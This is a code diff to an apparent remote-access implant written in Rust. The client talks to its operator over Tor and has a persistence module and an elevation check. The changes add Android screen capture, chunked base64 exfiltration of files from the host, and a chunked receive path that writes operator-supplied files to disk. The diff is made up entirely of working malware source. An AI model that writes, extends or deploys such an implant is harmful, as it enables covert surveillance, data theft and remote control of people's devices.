@@ -10,7 +10,8 @@ mod persist;
 use is_elevated::is_elevated;
 
 
-use arti_client::{TorClient, TorClientConfigBuilder, DataStream};
+use arti_client::{TorClient, DataStream};
+use arti_client::config::TorClientConfigBuilder;
 use std::sync::Mutex;
 use tempfile::TempDir;
 
@@ -31,18 +32,19 @@ use tor_rtcompat::PreferredRuntime;
 use tokio::io::split;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::process::Command;
-use anyhow::{Result, anyhow};
+use anyhow::{Result, Context, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 #[cfg(target_os = "windows")]
 use zstd::zstd_safe::OutBuffer;
-use core::task;
-use std::{fs,env};
+use std::fs;
 use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
 use libc::{c_int};
 
+#[cfg(not(target_os = "android"))]
 use screenshots::{Screen};
+#[cfg(not(target_os = "android"))]
 use screenshots::image::ImageOutputFormat;
 
 
@@ -88,10 +90,10 @@ impl Default for ClientConfig {
 }
 /// Initialize Tor client
 async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
-    let state = STATE_DIR.lock().unwrap()
-        .get_or_insert_with(|| TempDir::new().expect("create temp state dir"));
-    let cache = CACHE_DIR.lock().unwrap()
-        .get_or_insert_with(|| TempDir::new().expect("create temp cache dir"));
+    let mut state_guard = STATE_DIR.lock().unwrap();
+    let mut cache_guard = CACHE_DIR.lock().unwrap();
+    let state = state_guard.get_or_insert_with(|| TempDir::new().expect("create temp state dir"));
+    let cache = cache_guard.get_or_insert_with(|| TempDir::new().expect("create temp cache dir"));
     let config = TorClientConfigBuilder::from_directories(state.path(), cache.path())
         .build()?;
     let client = TorClient::create_bootstrapped(config).await?;
@@ -99,7 +101,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     Ok(client)
 }
 
-//#[cfg(not(target_os = "android"))]
+#[cfg(not(target_os = "android"))]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
@@ -222,17 +224,19 @@ Available commands:
     ").into_bytes())
         }
         "screenshot" => {
-            let filename = args
-                .get(0)
-                .ok_or_else(|| anyhow!("Missing filename"))?;
+            #[cfg(target_os = "android")]
+            let encoded = {
+                let output = std::process::Command::new("screencap")
+                    .arg("-p")
+                    .output()
+                    .context("Failed to run screencap")?;
+                general_purpose::STANDARD.encode(&output.stdout)
+            };
+            #[cfg(not(target_os = "android"))]
+            let encoded = take_screenshot_base64()?;
 
-            if filename == &""{
-                let encoded = take_screenshot_base64()?;
-                Ok(format!("[file] screenshot.png {}", encoded).into_bytes())
-            }else{
-                let encoded = take_screenshot_base64()?;
-                Ok(format!("[file] {} {}",filename, encoded).into_bytes())
-            }
+            let filename = args.get(0).filter(|s| !s.is_empty()).cloned().unwrap_or("screenshot.png");
+            Ok(format!("[file] {} {}", filename, encoded).into_bytes())
         }
         "upload" => {
             let input_filename = args
@@ -248,12 +252,16 @@ Available commands:
                 .and_then(|f| f.to_str())
                 .ok_or_else(|| anyhow!("invalid filename"))?;
             let encoded = general_purpose::STANDARD.encode(&data);
-            Ok(format!(
-                "[file] {} {}",
-                filename,
-                encoded
-            )
-            .into_bytes())
+
+            let mut output = format!("[file-start] {}\n", filename);
+            for chunk in encoded.as_bytes().chunks(16384) {
+                let chunk_str = std::str::from_utf8(chunk).unwrap();
+                output.push_str("[file-chunk] ");
+                output.push_str(chunk_str);
+                output.push('\n');
+            }
+            output.push_str(&format!("[file-end] {}\n", filename));
+            Ok(output.into_bytes())
         }
         "download" | "[file][" => {
             
@@ -392,6 +400,8 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
 
     let mut buf = [0u8; 16384];
     let mut buffer = String::new();
+    let mut dl_filename: Option<String> = None;
+    let mut dl_data: String = String::new();
 
     writer.write_all(build_prompt().as_bytes()).await?;
     writer.flush().await?;
@@ -411,6 +421,35 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
             buffer.drain(..=pos);
 
             line = line.trim().to_string();
+
+            if line.starts_with("download-start ") {
+                let parts: Vec<&str> = line.splitn(2, ' ').collect();
+                dl_filename = Some(parts.get(1).unwrap_or(&"unknown").to_string());
+                dl_data.clear();
+                continue;
+            }
+
+            if dl_filename.is_some() {
+                if line.starts_with("download-chunk ") {
+                    let parts: Vec<&str> = line.splitn(2, ' ').collect();
+                    if let Some(chunk) = parts.get(1) {
+                        dl_data.push_str(chunk);
+                    }
+                    continue;
+                }
+                if line == "download-end" {
+                    let fname = dl_filename.take().unwrap();
+                    let raw = general_purpose::STANDARD.decode(&dl_data)?;
+                    fs::write(&fname, &raw)?;
+                    let msg = format!("Wrote data to {}\n", fname);
+                    writer.write_all(msg.as_bytes()).await?;
+                    writer.write_all(build_prompt().as_bytes()).await?;
+                    writer.flush().await?;
+                    continue;
+                }
+                dl_filename = None;
+                dl_data.clear();
+            }
 
             if line.is_empty() {
                 writer.write_all(build_prompt().as_bytes()).await?;
@@ -514,8 +553,7 @@ pub async fn netclient() -> c_int {
     netclient_impl().await
 }
 
-#[no_mangle]
-#[export_name = "NetClientMain"]
+#[unsafe(export_name = "NetClientMain")]
 pub extern "C" fn NetClientMain() -> c_int {
     let rt = tokio::runtime::Runtime::new().unwrap();
     rt.block_on(netclient_impl())
